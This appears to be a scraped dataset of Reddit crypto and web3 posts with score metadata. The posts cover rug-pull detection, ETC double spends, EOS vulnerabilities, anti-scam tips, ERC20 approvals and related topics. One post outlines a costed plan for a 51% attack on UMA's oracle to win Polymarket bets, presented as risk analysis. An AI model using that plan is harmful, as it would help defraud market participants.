it's still not fool proof you can be slow rugged by the dev still. the token can also just take a dump but welcome to meme world! last but not least dexscreener does no checks if tokens are rugs, that's not their job so if you see something at #1 in the 5 min screen with lots of volume it doesn't mean it's not a rug. # slow rugging # standard slow rugging slow rugging is when the token owners sell from their distribution. there are a few ways to check this, first and easiest is watch the top 10 wallets you can see these in birdeye easily, or you can go to the main token account in solscan and see the highest holders. watch for these accounts to start selling. when they do check to see if they have any buys, if they do this is just a normal user selling and is 100% normal. if they don't, generally the dev offloading some. # sneaking slow rugging the 2nd way is a bit more in-depth and i only spend time doing this if i'm bored. a good way to watch is to use tools like birdeye or dexscreener (i prefer birdeye for this). check some of the larger sells, they usually start as dolphins, and generally sell in intervals around 30 minutes - 45 minutes after launch from my experience, and they keep doing it once the price stabilizes from the sell and rises again. first thing to point out there are a ton of mev bots out there, they have crazy high activity, this isn't a dev selling, generally you'll see a buy and an immediate sell. in birdeye you can click the link to go to solscan, once in solscan first look at their balance of the current token, if they have 0 go to their spl transfers tab, in there you'll see the sale, and where they originally received the token, if it's a dev selling generally their wont be a buy for the token, only a transfer from another account. if you have suspicions set a wallet filter in dexscreener and watch, if you see the account sell again which had a 0 balance and it's a similar sell (dolphin-ish so $1000 or more) it's a good chance it's a dev transfer selling. # overall tldr; to check for outright rugs use [rugcheck.xyz](http://rugcheck.xyz) (or similar tools where you aren't required to connect your wallet) if liquidity isn't locked 999 times out of 1000 it's a rug. if everything looks good but you're seeing big sells somewhat patterned out check if the account holder is a top wallet, or where they originally got their coins from, if it's not from a buy but from a transfer of another high ownership account, generally a dev selling. the above is a lot to read, feel free to summarize in chatgpt or something i just wanted spit it all out in the hopes of helping some people.",94,38,0.95,2024-04-06 14:53:31,web3,solana,sleepy_roger,False,81.1

[mark nesbitt](https://blog.coinbase.com/@mwnesbitt) >*note: the attacks are ongoing. we will continue to monitor the status of the network and update this article with the most recent information we have.* ### background info page 3 of satoshi nakamoto’s[ whitepaper](https://bitcoin.org/bitcoin.pdf), bitcoin: a peer-to-peer electronic cash system, states the following: “if a majority of cpu power is controlled by honest nodes, the honest chain will grow the fastest and outpace any competing chains.” the “honest\[y\]” of more than half of miners is a core requirement for the security of bitcoin and any proof-of-work cryptocurrencies based on bitcoin. honest action, in this context, means following the behavior described in the bitcoin white paper. this is sometimes described as a “security risk” or “attack vector,” but is more accurately described as a known limitation to the proof-of-work model. failure to meet this requirement breaks several core guarantees of the bitcoin protocol, including the irreversibility of transactions. many other cryptocurrencies, such as ethereum classic, have also adopted proof-of-work mining. the function of mining is to add transactions to the universal, shared transaction history, known as the blockchain. this is done by producing blocks, which are bundles of transactions, and defining the canonical history of transactions as the longest chain of blocks\*. if a single miner has more resources than the entirety of the rest of the network, this miner could pick an arbitrary previous block from which to extend an alternative block history, eventually outpacing the block history produced by the rest of the network and defining a new canonical transaction history. this is called a “chain reorganization,” or “reorg” for short. all reorgs have a “depth,” which is the number of blocks that were replaced, and a “length,” which is the number of new blocks that did the replacing. this, on its own, might end up being nothing more than a minor inconvenience. after all, the transactions all still exist, but they might have been put into a different order, perhaps delaying some of them. however, imagine a miner who also owns a large number of coins. the miner could send those coins to a merchant in a transaction, t, while also secretly extending an alternative block history. the miner’s secret blocks do not include t, but rather include a transaction that sends the same coins used in t to a different address. call that transaction t’. when the miner reveals this secret history, it will contain t’, not t. because t and t’ attempted to send the same coins and t’ is now in the canonical history, this means that t is forever invalid, and the recipient of the coins sent in transaction t never even received them in the new, now-canonical history. more info on this can be found[ here](https://en.bitcoin.it/wiki/weaknesses#attacker_has_a_lot_of_computing_power). ### what we observed we observed repeated deep reorganizations of the ethereum classic blockchain, most of which contained double spends. the total value of the double spends that we have observed thus far is 88,500 etc (\~$460,000). *note: a full blockchain analysis is beyond the scope of this article. further research into the addresses sending the double spend transactions, the history of sends/receives from the addresses, the block fields

Why do we need crypto technology rather than financial instruments?,"hello everyone here. i should say i am new to crypto technologies, so don’t judge. i’ve been learning about crypto for a few months and i see that blockchains seem to become a part of our everyday life now as their popularity is growing. what i know is it stores information electronically in digital format for better security and fidelity. so blockchain technology is widely used to store information about transactions - so it’s used for financial instruments. that’s basically how it started. but now the technology can be used for other things, like some kind of communication protocol? i read about a web3 on-chain communication protocol like keybase or ylide (which has different use cases like customer support, wallet-to-wallet communications, dao communications, blog, news, forums etc.). all these seem to be gimmicky and in actuality they don’t really provide use for our everyday lives. where else can we use blockchains technology? is there something that is useful to everyone and not just a tiny portion of the internet?",58,92,0.9,2022-09-29 04:16:55,web3,CryptoTechnology,dazzledswag46,False,80.6

"Curve Finance is the Base Protocol for Andre Cronje's new Fixed Forex application. Forex does $6.6T in daily volume....if the defi forex protocol took even a small percent of that volume, Curve stakeholders would be massive incentivized by their portion of transaction fees.","on july 2nd, andre cronje, the programmer behind yearn finance, announced a new project that he was launching: fixed forex. the interesting thing is that the project is notable for being built upon the curve protocol for stable coin liquidity….a protocol with low slippage and minimal impermanent loss. although the project is experimental (and currently unaudited), the concept is bold and potentially a groundbreaking use-case for decentralized finance (defi). to understand the potential significance of this project, it is important to understand the massive amount of volume which moves through the traditional finance (tradfi) forex market everyday. the foreign exchange or forex market is the largest financial market in the world – larger even than the stock market, with a daily volume of $6.6 trillion, according to the 2019 triennial central bank survey of fx and otc derivatives markets. if fixed forex was able to take even 1% of the transaction volume away from tradfi…that would be 66 billion dollars moving across the curve protocol every day. fees and pool parameters are decided by the curve dao. currently, the fee on all pools is 0.04%, of which 50% goes to liquidity providers, and 50% to vecrv holders (members of the dao). as such, vecrv holders get .02% of all transaction fees. .02% of 66 billion daily fees is: 13,200,000 a day. since rewards inception on 10/7/20, a total of $30,059,590.81 has been generated for stake holders. imagine if forex volume could equal those rewards in 2.5days. on chain growth would be extraordinary with significant value accrued by stake holders. **reference:** [https://andrecronje.medium.com/](https://andrecronje.medium.com/) [https://www.investopedia.com/articles/forex/11/who-trades-forex-and-why.asp](https://www.investopedia.com/articles/forex/11/who-trades-forex-and-why.asp)",78,59,0.92,2021-07-12 12:50:18,web3,defi,afirebrand,False,79.60000000000001
How could blockchain be used to better-incentivise massive human progress?,"capitalism, in spite of it’s downsides, is getting humanity pretty far, pretty quick. a fundamental fixation on the self provides both its incentives and limitations. how could progress in areas like climate change, space exploration, nuclear energy and ageing be sped up with the blockchain miracle? progress operates on incentives, but it can be painstakingly hard to reach the level of incentives required to tackle some of humanities’ largest problems. case in point, the space industry is just getting started, but there are monumental challenges ahead: • building an industry large enough to terraform planets • making space travel economic • fixing/improving earth economically • paying for space cities and oneil colonies, and so on... what then, for instance, could digital super-gold, defi, nfts, etc do to supercharge capitalist progress in the areas truly useful to humanity?.. and perhaps decentivise the negative aspects? maybe a billion node network could control hundreds of crypto pots targeting specific problems that are awarded in a decentralised way? maybe they’re designed to accumulate value until the job is done? maybe social coinsciousness is built in by design; everyone can see if you’re a bad actor, like a panopticon? maybe there are rules to control negative group think, in a similar vein to asimov’s laws? tldr; what can crypto do to bring the last ten thousand years of progress into the next hundred?",88,44,0.92,2021-06-16 15:29:45,web3,CryptoTechnology,PaulWaine,False,79.60000000000001

And it seems like those are more than just random software bugs.,"chinese internet security giant 360 has found ""a series of epic vulnerabilities"" in the eos platform. some of the bugs allow arbitrary code to be executed remotely on eos nodes and even taking full control of the nodes. according to 360: attacker can deploy smart contracts w/ malicious code to eos super node, which will execute the contract and trigger a security bug. once the contract is included in a new block, all full nodes including backup nodes, exchanges, wallet nodes, are all susceptible to attack. [source](https://twitter.com/cnledger/status/1001335269180653568) eos should be given the benefit of the doubt for now. this incident further stresses the importance of having a thorough security audit prior to an open-source software release.",98,29,0.9,2018-05-29 02:08:57,web3,CryptoTechnology,crypto_ha,False,79.4

(icymi the last time nick p & kitboga got together, they got revenge on an extortion scammer. [https://www.youtube.com/watch?v=rfgqmvheroa](https://www.youtube.com/watch?v=rfgqmvheroa)) there’s a lot of advice out there, here are some practical tips... https://preview.redd.it/tkoiyhuroh1e1.png?width=1920&format=png&auto=webp&s=20fec62f42742c9a907ab2ac7e3b160003f1245d # stay skeptical in today’s world, scams are more sophisticated than ever, so staying skeptical is a must. if something seems too good to be true—whether it’s a “prize” you never entered to win or a quick, guaranteed investment return—trust your gut and question it. scammers often use excitement or urgency to push you into acting fast. instead of rushing, pause and double-check. search for reviews, verify contact info independently, and never feel pressured into making a decision on the spot. when it comes to unexpected offers or requests, a little doubt can go a long way in protecting you. # boost your security strengthening your digital security doesn’t have to be complicated, but it makes a world of difference. start with the basics: use strong, unique passwords for each account (a password manager can help!), turn on two-factor authentication (2fa) wherever possible, and update your software regularly to stay protected from vulnerabilities. check your accounts every so often for any strange activity, and see if your email or usernames have been involved in any data breaches on sites like haveibeenpwned.com. these small steps are like locking your doors online—they make you much harder to target. # stay calm scammers often play on fear, urgency, or excitement to get you to act without thinking. whether it’s a supposed “emergency” call from a fake tech support rep, a warning about “suspicious” bank activity, or even a message from a “loved one” needing money urgently, stay calm. taking a breath and assessing the situation will help you avoid falling for these high-pressure tactics. think carefully, verify independently, and remember that legitimate companies won’t rush you into decisions. keeping calm is one of the best ways to see through a scam. # remain private your personal information is valuable, and scammers are eager to get their hands on it. be cautious with what you share online—whether it’s on social media, forms, or even email. only provide sensitive details when you’re sure who you’re dealing with, and verify that they truly need that info. take a moment to review your privacy settings on apps and limit permissions to only what’s necessary. it’s easier than you might think for scammers to piece together small bits of info to impersonate you or access your accounts, so keeping your details private is essential. # be vigilant scammers and hackers are always on the lookout for openings, so a little vigilance goes a long way. double-check urls and email addresses for minor errors—they’re often a sign of phishing. don’t open attachments or click on links from unexpected emails, and keep an eye on your accounts for unusual activity. regularly check if any of your info has been exposed in a data breach (haveibeenpwned.com is a great tool for this) and secure your accounts if needed. staying vigilant helps you spot red flags early and keeps you one step ahead of potential threats. we’d like to thank you for taking the time to read these tips—staying informed is half the battle! keep an eye out for more security themed content on kraken’s [twitter](https://x.com/krakenfx), [instagram](https://www.instagram.com/krakenfx/), [linkedin](https://www.linkedin.com/company/krakenfx/) and [tiktok](https://www.tiktok.com/@krakenfx) this week. until then, stay safe out there. **kraken’s official social channels:** [https://x.com/krakenfx](https://x.com/krakenfx) [https://www.instagram.com/krakenfx/](https://www.instagram.com/krakenfx/) [https://www.linkedin.com/company/krakenfx/](https://www.linkedin.com/company/krakenfx/) [https://www.tiktok.com/@krakenfx](https://www.tiktok.com/@krakenfx) [https://www.youtube.com/@krakencryptoexchange](https://www.youtube.com/@krakencryptoexchange)",90,41,0.88,2024-11-17 11:36:45,web3,CryptoCurrency,krakenexchange,False,79.2

About Defi lending……,"in our opinion, at present, lending protocol only allows highly liquid assets, such as eth, to be mortgaged. in fact, this kind of collateral can also be borrowed by others as liquidity assets. for example, people who deposit bat can borrow the eth deposited by the others, or even someone may deposit usdc to borrow eth for special purposes. therefore, the liquidity of compound is super abundant, there is no ""waste"" assets, and the internal efficiency of the system is very high, so it is difficult for compound to add low liquidity assets as collateral. high liquidity assets can be realized at any time, or even used as the base currency to purchase other assets. therefore, using this kind of asset as collateral reduces the investor's own liquidity (because the pledge rate is generally 70%+x%, which is obviously smaller than the original asset). therefore, this kind of investor seems not the real liquidity demander, but a arbitrageur who makes circular pledge based on token price rising logic. for the whole market, the overall liquidity has shrunk and the risk has increased, which is an unhealthy mode in fact. the significance of defi lending service should be an advanced liquidity system, which can create maximum value by finding and providing liquidity to those who need liquidity. long term -- the possibility of pledge of high quality assets in reality: aave, makerdao are trying in this way. medium term -- the possibility of changing the mechanism of over collateralized. short term -- increase the possibility of more currency launching on lending platform as collaterals.",109,6,0.97,2020-09-25 10:09:59,web3,defi,CheeseBank2020,False,77.5

Market risk of a 51% attack on Polymarket,"over the past few days, i did a deep dive into polymarket's implementation and the current state of the market. here’s what i’ve found: uma is a cryptocurrency protocol that created a system to verify statement accuracy (e.g., 'trump won the 2024 election'), which they call their 'optimistic oracle'. an 'asserter' can post (assert) this information to the network, staking some cryptocurrency (any approved erc20 token) alongside the assertion. anyone who wants to dispute it (the 'disputer') may do so, typically by matching the asserter's stake. if a dispute happens, the process escalates to the 'data verification mechanism' (dvm). when it reaches dvm, the tokenholders of uma decide by vote how the assertion should resolve (i.e., ultimately whether the asserter or the disputer receives the staked currencies). they do this with one vote per uma token. polymarket operates as a separate contract on the blockchain that interacts with uma. the api allows users to create betting markets, bet on them, and perform various tasks. the polymarket api also allows users to propose and dispute the outcomes of the betting markets when they end, costing about $750 to assert, and then another $750 to dispute. if there is a dispute, it gets escalated to uma's dvm system. disputes rarely happen because the dvm works. typically, nobody has any incentive to lose their $750. this clever solution allows them to run a completely decentralized betting market that cannot be shut down. however, the market cap of uma is only about $200m as of writing this post. a 51% attacker would need to own approximately $100m worth of it. it is my understanding that any single person and/or collaborative group of people with such a quantity of uma could then purchase and dispute one side of every contract on polymarket, vote in favor of themselves during the dvm for each of them, and win every bet. doing this would destroy their $100m of uma, but they'll potentially make more from the bets. a quick browse of polymarket shows an order book with quite a few contracts readily available for purchase, many of them priced at 0.1 cents which can pay out $1 to an attacker (1000x). it's difficult to determine exactly how much an attacker could make on polymarket because it depends on a lot of factors and a moving market. but a 51% attacker might attempt something like this on the ""presidential election winner 2024"" market ( https://polymarket.com/event/presidential-election-winner-2024 ): * buy ""yes"" on chris christie. $0.001. buy 72 million shares right now for $72k. * buy ""no"" on trump over a few weeks or months. $0.42. maybe accumulate 100 million shares for $42m * buy ""no"" on kamala over a few weeks or months. $0.58. maybe accumulate 100 million shares for $58m * accept the loss of $100m worth of uma due to the price collapsing **this would cost roughly $200m and make $272m.** they could make a bit more on the smaller betting markets as well. there's only about $670m of usdc on the polygon network in total, which puts a hard limit on how much money exists in these contracts. at the moment, at least, someone on these markets betting that chris christie is 99.9% likely to lose is not correctly pricing in the risk of a 51% attack on uma. there is a different play for someone with a lot more money and power to 51% attack uma, and that would be to gain favor with trump by using their 51% to decide trump wins on the betting markets. it could be used to help the publicity battle that trump will fight if he doesn't clearly win the election. i would guess there's not quite enough money to be made just yet to justify a risky, expensive attempt to do a 51% attack on uma, in large part because acquiring the 51% over the last few years would have cost the attacker a lot more than $100m (see historic prices). if anyone already did this, they're probably planning to hold on for something bigger. i'd put a small non-zero chance on a malicious actor already having acquired 51%. so, in conclusion, the current market seems to be teetering on the edge. if uma's market cap doesn't rise as fast as polymarket's betting markets, polymarket may need to switch to a voting network that they have 51% control over, or some other system that can't be readily abused. references: https://docs.uma.xyz/protocol-overview/how-does-umas-oracle-work https://learn.polymarket.com/docs/guides/markets/dispute/ https://www.coingecko.com/en/coins/uma",78,55,0.85,2024-11-02 18:18:06,web3,ethereum,Fragsworth,False,77.3

"A quick primer on how ERC20 token works, and how approving contracts to spend from your wallet works.","there seems to be a lot of questions lately regarding erc20's and spending approval's, especially infinite approvals. i have done my fair share of solidity based smart contract development (played a little bit with vyper too), and the concepts of how erc20's work is actually very straight forward. i also just took some adderall and feel like writing :) first thing to know is what an erc20 actually is. at the most abstract level, an erc20 is a smart contract. the contract, like all contracts, lives on a particular evm (ethereum virtual machine), for example ethereum evm or polygon evm. erc20 is just an interface, not an implementation. what this means is that developers know that anything that is an erc20 has a standard set of functions they can call to interact with it, for example: - `transfer(address recipient, uint256 amount)` - `approve(address spender, uint256 amount)`. erc20 does not define exactly what happens when these functions are called (the implementation or the code that happens when these are called), it just says that these functions need to exist (as well as others) for the smart contract to be considered an erc20. i could create a smart contract that does nothing when any of those functions are called, but as long as it has those functions it is still an erc20. also keep in mind, that the contract could (and often does) have a bunch of other custom functions that are not part of the erc20 interface, but is still an erc20. ever used a beefy finance vault? their vaults are all erc20's but also handle a bunch of other things such as harvesting and compounding yields. in general most erc20's will use the standard erc20 implementation from somewhere like [openzeppelin](https://github.com/openzeppelin/openzeppelin-contracts/blob/master/contracts/token/erc20/erc20.sol). if you don't need to reinvent the wheel then you don't need to go get the erc20 code tested and audited, openzeppelin is very well designed and tested. somewhat often, some additional functionality will be added to these standard implementations, things like a percent of the coin gets burned on every transfer, or a scam dev gets new coins minted every time something happens. so not all erc20's behave the same, but most of them are going to be pretty similar. erc20 tokens are essentially a ledger of accounts and their balances, spending permissions, as well as some other privileged functions such as mint and burn that are reserved for the smart contract owner or some admin permission holder. the state of the accounts, balances, and permissions all live within the smart contract. like all smart contracts, the state of the smart contract is held on the evm. the evm only stores and updates the state of the contract, it doesn't enforce any particular set of token rules, it just makes sure that the rules set by the contract are followed. by default, only your own account will be able to spend the token in your account. when you interface with other smart contracts, you almost always do **not** send your tokens to the contract. typically a smart contract will be granted permission to spend a certain amount of tokens from your balance, and then in a different transaction the contract pulls from your balance. i like to think of sending tokens to an address as a 'push' of your token balance, and a contract spending your tokens as a 'pull' of your balance. a 'pull' happens within a smart contract function. for example the function will somewhere call the `transfer(to, from, amount)` method that was referenced above. so when you do something like trade with a uniswap lp (pancake, sushi lp's, etc), you grant permission for the lp contract or the router contract to be able to pull a certain amount of tokens from your account. you grant permission to use a certain token and quantity. the permission granting is done in single transaction that does only that (unless you are spending though a proxy or something). in some other transaction the contract will run a function that somewhere in its logic will pull from your balance. for example the function might be `swap(token0, token1, amount)`. swap will do a lot of things, transfer tokens to and from all types of places (the pool, the burn address, rewards address, etc) and will also pull token0 from your address balance and then transfer token1 to your address. when you approve contractabc to spend tokena from your address, and approve it to spend amount1: - contractabc will only be able to spend tokena from your address, other tokens are not impacted. remember that erc20 tokens keep their own records, so the state of your account's permissions on tokena smart contract is updated, but it doesn't have any impact on the state of tokenb's smart contract. - contractabc can only spend amount1 from your address. the amount that is being spent is summed each time that contractabc pulls from your balance. if you approve it to spend 100 tokens, and the next transaction it spends 75 tokens from your account, it is then only approved to spend an additional 25. this is how standard implementations work, but remember these rules are governed by the implementation that tokena used for its erc20 code. i have seen audits that mention that the approve function literally didn't enforce an amount after an approval was given, it was either approved for infinite or not approved at all. - it doesn't matter if you have your private keys in cold storage or if you use a hardware wallet. once you sign permission for a smart contract to use a certain amount of tokena from your balance, that smart contract can spend that balance at anytime, whether or not you are the one that initiates the transaction or involved in any way. you do not need to be a signer on the transaction that spends your tokena. whatever spends your tokena balance just needs the proper permission to do so. remember that their may be other tokens that require you be a signer as well, but that is not at all the standard. there are various ways that you can prevent malicious contracts from taking from you. - have some idea what you are dealing with. is this something that is commonly used, audited, and popular? or is this something that is new, unaudited, and sketchy? be much more hesitant to grant big permissions to the latter. but still be careful with the first. bzx was audited (at least i thought they were, rekt says they weren't), and had been around for a while, but they had a very poorly designed single point of failure (developer key) and the ability to upgrade their contracts to do whatever. if you don't know for sure what to do, just take extra precaution. create a new address, transfer your tokens there, and do approvals with the sketchy contract from that new address which limits all of the exposure solely to that new address. - use tools like the [token approvals page on etherscan](https://etherscan.io/tokenapprovalchecker) (and other *scan explorers) to remove approvals that are inactive. i will commonly unapprove contracts right after they use what i want them to use. i would rather spend a few minutes and a couple dollars, than lose thousands. - on metamask and other wallets, you are able to edit the amount you are approving a contract to spend from. it makes sense to limit the approval amount. make sure you know how many decimals to use, many erc20's use different decimal amounts, most of the are 18, some are 6. 18 decimals means that 1 token is 1 followed by 18 zeros. on metamask instead of typing 18 zeros, you can just append the number by e18, so 20 tokens would be the same as typing in 20e18. - split up your accounts. don't use one account for everything. if you give large permissions to a malicious contract and only interact with it from one of your accounts, you limited the damage that was done. for even better security, don't have all of your accounts derived from one seed phrase. for even better security, don't have all of your accounts on the same computer. for even better security, just stop using windows... that can solve a lot of issues right there (half sarcastic, half serious). - keep your tokens deployed and keep up to date on hacks. i have a friend that got a total of $0.025 stolen from a few of his addresses from the bzx hack. i think he said it was usdc. he had over $100k usdc in those accounts, but they were aave usdc and also other usdc deployed into lp tokens. lp tokens are their own erc20 with their own accounting, so permissions from other erc20 contracts don't apply, same thing with aave usdc. my friend saw in the news that bzx was hacked, he also noticed that some of his usdc dust was taken from two of his accounts. he was able to go unapprove the bzx contracts from spending his coin. so because he had his assets deployed and not sitting around in his wallet, he was safe. - if you do want to have token balances sitting in a wallet (cold storage, etc), then you should have it in an account that is actually cold. don't approve any contracts, and don't have the same seed phrase as your hot wallet. consider using something like [gnosis safe](https://gnosis-safe.io) or a hardware wallet. edit: if you do go the route of not giving unlimited spending permission, realize that when a contract runs out of permission it will cause it to error when you try to use it. the error doesn't always say that you don't have permission, it could just estimate a crazy high gas fee or have some other issue. keep this in mind, and be ready to increase permissions when that happens. the website front end applications almost always only check if you have spending permission that is greater than 0, not how much permission is left.",89,32,1.0,2021-11-12 16:31:55,web3,defi,Physiocrat,False,76.2

Thoughts on Voluntary Governments.,"for those who are unaware john palmer published this essay in 2016 about how blockchain can be leveraged to create voluntary governments . we are fast losing our relation to our geographical location and most of our culture and values are becoming part of the network we are a part of, which is mostly now over the internet. so that's the premise. the essay is here for anyone interested [https://1729.com/voluntary-governments](https://1729.com/voluntary-governments) is a nation state over blockchain even possible and if so how does it look like ? the premise as i see it is very much true, i don't know what my next door neighbor believes in , i go around finding like minded individual people over the interwebs and the connect and socialize with them. we no longer refer to them as our ""internet friends"" but just ""friends"" . so it is surely understandable that people will want to form groups over the internet , and now we have the blockchain to provide such a group with the infrastructure to create a government . property rights , loans, voting , laws and most other infrastructure can be brought under the blockchain, and as the author points out the government has never been as progressive as companies which again is true. property : so as i understand this online country that we are creating has land in the form of private property that citizens on that country own. that ownership is however given to them by the geographic country that you are in. are we going to see a time when the geographic country will just let its citizen make its own land and property a part of a online nation and give up all authority over it ? i don't see that happening. when the author says testing a government online in vr, i think he is significantly understating what a government can and needs to do, to even qualify as being called a government. how are they going to supply water and food to the citizens, electricity , police, justice system. those are to name a few that are achieved by your geographic nations government by enforcing the rule of the land through police and various other departments. how is all this going to take place over a vr system, i didn't find any answer to those questions in this essay. we do finally have a currency in crypto that could give your country's currency a run for its money :p but government is more then its currency. it certainly is the crux of its power yes, but still not all of it and once people start noticing that by taking so much power away from the government their own lives are being effected negatively they might not be that excited about this brave new world.",53,84,0.9,2021-07-12 14:56:19,web3,CryptoTechnology,helloSapien,False,74.4

I can't understand L2 networks no matter what,"so my current understanding about roll-ups is that since eth gas fees are like really high per transaction, so it would be much better if the transactions are bundled and submitted as a single transaction , but like how does this work? say if we take optimism for example , like a lot of nodes are running for that particular l2 right and if i make a transaction to that network , it will be bundled with other transactions and submitted as a single transaction to the main network? is it like that? if say bob sends 1 eth to alice , like how does this work on roll-ups , first the optimism nodes do the work on verifying stuffs like the balance and other and what do they do ? submit it to the main network? and how do they submit, like via rpc to a contract or smtn? please help, i can't find a source that goes into technical details of this other than than blog posts saying what are l2s and how they fix the eth scaling issues. --- edit: it finally clicked for me , huge thanks to u/departedquantity for helping me out. so here's my understanding: till so far in my mind was that the rolling up is for the l1 transactions, since transaction fees are higher so send the transaction to a separate network and let them batch up multiple users transaction together with mine and submit it to the l1 as a single transaction with some proofs. and some smart contract does some magic and everything is good but it doesn't make any sense because someone either way has to pay to change the state on the main chain which is going to be really expensive. but the thing is that the l2 is a network own it's own with an evm and state changes and etc etc. connected to the main chain with bridges so an equivalent on chain can be given in the other. and all the transactions happening out there is independent own its own and what it submits to the main network are transactions details(or whatever) in l2 so if something ever happens to it , it can be recovered. and not l1 transactions that are verified off-chain and submitted as a batch to the main chain.",47,94,0.86,2024-10-21 08:27:28,web3,ethereum,damnberoo,False,74.39999999999999

How to become a Blockchain Developer in 2023 ( A Zero to Hero Guide) - PART 1,"&#x200b; this is a question i often see on reddit , linkedin and on other platforms as well, so i decided to share this cool blockchain developer roadmap by[ ](https://www.linkedin.com/feed/#)[https://roadmap.sh/blockchain](https://roadmap.sh/blockchain) let me give a detailed breakdown of how to follow this roadmap. i've added some extra topics that will also be of use to you in interviewquestions. if you want to start off your career in web3 or blockchain, the first step for you is learning about basic & general blockchain knowledge, this is all theoretical. \- basic blockchain knowledge \- what is a blockchain? \- what is decentralization? \- what is distributed computing? \- what is a distributed ledger? \- blockchain structure \- how are blocks created? what is a genesis block? \- why was bitcoin created? \- difference b/w programmable & non-programmable blockchains \- how is ethereum different from bitcoin ? \- what are the types of blockchains? (public, private, hybrid & consortium) \- what are the use cases for the different types of blockchains? \- what problem is blockchain solving? \- general blockchain knowledge \- learning about the block structure of a blockchain \- blockchain forking(soft forks & hard forks) \- consensus protocols (proof-of-work, proof-of-stake, proof-of-history etc..) \- why do we need a consensus protocols in blockchains? \- different cryptographic algorithms (symmetric & asymmetric cryptography) \- blockchain interoperability ( you can read about how l1 & l2's work together) this covers all of the basic knowledge about blockchains, you may wonder which resource you should use for learning these concepts. i recommend understanding these concepts through the whiteboard crypto youtube channel here's the link to the whiteboard crypto channel : [white board crypto youtube.](https://www.youtube.com/c/whiteboardcrypto) now that you know most of the things about blockchains, it's time for you to make a decision to dive into a particular blockchain or start from one. \- evm based blockchains (which have the same virtual machine using the same language to build smart contracts) \- ethereum \- polygon \- binancesmartchain \- avalanche \- optimisim \- other major blockchains which now are getting popular: \- solana (rust programming lang for smart contracts) \- cardano (fairly new - in-demand - uses haskell and plutus for smart contracts) \- algorand (uses reach - similar to js & pyteal using python for smart contracts) \- cosmos (also known as ""blockchain 3.0"", an ecosystem of blockchains) research about all of these ecosystems before getting into them, start & master one. move on to the next one. in my next post i'll be continuing from smart contracts and moving further. see the original post on linkedin :[https://www.linkedin.com/feed/update/urn:li:activity:7003266613122609152/](https://www.linkedin.com/feed/update/urn:li:activity:7003266613122609152/)",94,20,0.99,2022-11-29 04:49:35,web3,ethdev,Smallguyfyi,False,74.30000000000001

[Research] Game Channels: state channels for the gambling industry with built-in PRNG,"**what have we done** after very extensive and detailed research in conjunction with blockproof tech llc, dao.casino is announcing that it has found the future of the gambling industry. in what it is terming gambling 3.0, dao.casino has found a way to increase interaction speed between dapps’ players, without losing any gas costs or security. the study has successfully shown that the generating of a new block approximately every 15 seconds and every transaction taking an average of six minutes can be reduced. this is because game channels will run on top of existing blockchains. **abstract** blockchain technology has immense potential. at the same time, it is not always possible to scale blockchains. state channels solve the problem of scalability while increasing the blockchain's speed and efficiency. state channels present a workaround to current blockchains' tps (transaction per second) bottleneck. we used state channels as a foundation and created game channels. we built it around the needs of the gambling market. we also developed signidice prng as well as a dispute resolution mechanism. signidice uses unique digital signatures and is also described below. the potential use of game channels technology is not only gambling; some types of online gaming may also be able to use it. read more about our research on ethresear.ch: [https://ethresear.ch/t/game-channels-state-channels-for-the-gambling-industry-with-built-in-prng/4341](https://ethresear.ch/t/game-channels-state-channels-for-the-gambling-industry-with-built-in-prng/4341) link to the paper describing the study: [https://dao.casino/rnd/gamechannels.pdf](https://dao.casino/rnd/gamechannels.pdf)",106,6,0.82,2018-11-22 05:04:42,web3,ethdev,ForeverScorned,False,74.2

Devs are extremely toxic to their community.,"my friend got me into this game a few months ago. i at $800, my friend at $500. it has been rocky the whole time. we have been asking valid questions in their telegram, never aggressive or mean, just asking for more communication or explanations for sudden changes (like changing the price of an item from 1500 to 15,000) or about the very buggy launch they had. there were a few red flags there. we were threatened a few times with being banned for asking questions. basic things like clarification on how their systems worked or pointing out bugs. for example, i bought a gecko on their market place, put it on my land to farm, and it was dead and already a 4th used up. there was absolutely no way to see this in the marketplace. when i asked about this i was met with ""why would you buy there? you should have just bought from someone here"". i explained why it was concerning and how it'd look to newcomers. i was told to drop it or i would be kicked after just the two messages. it was a shit show the whole way, but today they finally reset everything and things were finally looking great and like everything was working. i was thrilled and wanted to invest more. i found a gecko on the marketplace i wanted to buy, but having been burnt once (which they fixed with the reset), i asked in the telegram if the marketplace geckos had also been reset. the dev representative from the game responded with ""use logic"". i said they could potentially be two different situations and that i just wanted to check before i bought. i was told to ""use my brain"". i told them that that was an offensive thing to say and that's when the shit hit the fan. i was told ""i don't care"" by the dev so i tried to explain why using an apology of a store owner mocking his customers for asking the price of something unlabeled. he replayed ""i don't work for you."" he then continued to tell me i was stupid because he was using sarcasm to make a joke. to which i replayed ""intent vs impact"" and that sarcasm doesn't work on the internet. i also told him i was offended by his actions and that it was really toxic way to handle the community and their customer service. he said, ""we don't have customer service"". it went on like this, at no point was i mean or rude, but he kept saying i was a ""gen z moron"" or that i am ""just a poor idiot"" and to talk to him once i was a millionaire because ""i'm not worth his time otherwise"". he then deleted all of my messages and kicked me from the group. i tried to screenshot as much as i could from the conversation, but it's on my work computer, so it'll have to wait. he messaged me right after kicking me. i've included those screenshots from my phone in this post. i am just dumbfounded. why someone would double, triple, quadruple down on saying/showing that they don't care about their community? i just needed a ""yes"" or ""no"" but instead i got a raging asshole. someone from the group messaged me afterward and said that he was kicked too after he said ""did you really just delete all of that guy's messages and kick him? he just asked a simple question and you started to berate him"". so yeah, devs are total assholes that hate their community. 100% do not invest in this project. wouldn't be surprised if it was just a money laundering thing. https://preview.redd.it/qan4g98wkku81.jpg?width=1440&format=pjpg&auto=webp&s=a611f911feeb80e166d3f7e4d4eade9e0282a9ef https://preview.redd.it/9gk3aa8wkku81.jpg?width=1440&format=pjpg&auto=webp&s=b17926f95fb0dc287d8e40d11f215616b1384f64 https://preview.redd.it/9dham58wkku81.jpg?width=1440&format=pjpg&auto=webp&s=c4eb7f771da022af6ce1da86d28dbafee4ba21da",92,22,0.95,2022-04-19 19:25:24,web3,defi,ibrakeforwombats,False,73.5

